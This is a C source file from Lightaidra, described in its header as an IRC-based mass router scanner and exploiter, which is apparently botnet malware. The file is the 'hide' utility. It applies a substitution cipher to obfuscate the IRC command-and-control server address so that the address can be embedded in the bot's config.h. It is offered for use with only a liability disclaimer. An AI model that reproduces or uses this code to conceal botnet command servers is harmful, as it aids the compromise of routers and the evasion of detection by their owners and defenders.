/*
 * hide.c - USE LIGHTAIDRA AT YOUR OWN RISK!
 *
 * Lightaidra - IRC-based mass router scanner/exploiter.
 * Copyright (C) 2008-2015 Federico Fazzi, <eurialo@deftcode.ninja>.
 *
 * LEGAL DISCLAIMER: It is the end user's responsibility to obey 
 * all applicable local, state and federal laws. Developers assume 
 * no liability and are not responsible for any misuse or damage 
 * caused by this program.
 *
 * example: ./hide -encode "127.0.0.1:6667"
 *          ./hide -decode ">@.C<C<C>U,,,." <- copy into config.h
 * CHANGE THE POSITION OF ENCODES[] VALUES IF YOU WANT YOUR PRIVATE ENCODING. 
 */

#include <stdio.h>
#include <string.h>

char encodes[] = { 
    '<', '>', '@', '_', ';', ':', ',', '.', '-', '+', '*', '^', '?', '=', ')', '(', 
    '|', 'A', 'B', '&', '%', '$', 'D', '"', '!', 'w', 'k', 'y', 'x', 'z', 'v', 'u', 
    't', 's', 'r', 'q', 'p', 'o', 'n', 'm', 'l', 'i', 'h', 'g', 'f', 'e', 'd', 'c', 
    'b', 'a', '~', '1', '2', '3', '4', '5', '6', '7', '8', '9', 'F', 'U', 'C', 'K'
};

char decodes[] = { 
    '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', 'a', 'b', 'c', 'd', 'e', 'f', 
    'g', 'h', 'i', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'z', 'y', 
    'w', 'k', 'x', 'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'L', 'M', 'N', 'O', 
    'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'Z', 'Y', 'W', 'K', 'X', '|', ':', '.', ' '
};

char encoded[512], decoded[512];

void encode(char *str) {
    int x = 0, i = 0, c;

    memset(encoded, 0, sizeof(encoded));
    while (x < strlen(str)) {
        for (c = 0; c <= sizeof(decodes); c++) {
            if (str[x] == decodes[c]) {
                encoded[i] = encodes[c];
                i++;
            }
        }

        x++;
    }

    encoded[i] = '\0';
    return;
}

void decode(char *str) {
    int x = 0, i = 0, c;

    memset(decoded, 0, sizeof(decoded));
    
    while (x < strlen(str)) {
        for (c = 0; c <= sizeof(encodes); c++) {
            if (str[x] == encodes[c]) {
                decoded[i] = decodes[c];
                i++;
            }
        }

        x++;
    }

    decoded[i] = '\0';
    return;
}

int main(int argc, char *argv[]) {
    if (argv[1] == 0 || argv[2] == 0) {
        printf("./lighthide [-encode|-decode] [string]\n");
        return(1);
    } 
    else if (!strncmp(argv[1], "-encode", 7)) {
        encode(argv[2]);
        decode(encoded);
        printf("encoded[%s]:\n%s\n", decoded, encoded);
    } 
    else if (!strncmp(argv[1], "-decode", 7)) {
        decode(argv[2]);
        encode(decoded);
        printf("decoded[%s]:\n%s\n", argv[2], decoded);
    }

    return(0);
}
